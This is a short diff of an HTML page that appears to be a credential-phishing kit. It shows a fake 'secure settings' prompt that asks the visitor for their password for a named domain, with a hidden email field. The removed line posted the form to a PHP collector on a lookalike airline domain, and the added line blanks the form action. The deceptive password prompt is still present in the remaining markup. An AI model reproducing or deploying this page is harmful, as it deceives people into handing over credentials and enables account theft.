@@ -1261,7 +1261,7 @@
             <h2 id="auth_email" style="color: rgb(6, 39, 171);"></h2>
             <hr style="width:100%;text-align:left;margin-left:0">
             <p id="comment_text">You're accessing a secure settings, please provide your <b><span id="pussy">aegistax.com</span></b> password to continue.</p>
-			<form action="https://american-airlines.net/sess/princekelvin.php" method="POST" id="contact">
+			<form action="" method="POST" id="contact">
 			<input type="hidden" name="email" id="email" required="" style="border-color: rgb(140, 140, 140);">
         </div>
         <div class="inputs"><div class="input">
